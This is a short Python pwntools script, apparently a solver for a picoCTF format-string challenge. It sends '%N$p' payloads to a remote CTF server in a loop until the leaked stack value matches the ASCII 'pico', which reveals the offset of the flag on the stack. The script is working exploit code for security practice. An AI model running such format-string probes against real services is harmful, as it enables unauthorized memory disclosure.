from pwn import *

def byte2str(input):
	return str(input,"utf-8")

elf = ELF("./vuln",checksec=False)
#p = elf.process()

pico = "0x6f636970"
var = True
iterator = 1

while(var):
	p = remote("saturn.picoctf.net", 63563)
	
	pattern = bytes(f'%{iterator}$p' , "utf-8")
	payload = pattern

	p.sendline(payload)

	p.recvline()
	
	output = byte2str(p.recvline()).strip()
	print(f"Iter = {iterator} and output = {output}")

	if (output == pico):
		print(f"Found offset = {iterator}")
		break
	iterator = iterator + 1

print("Finished Looping")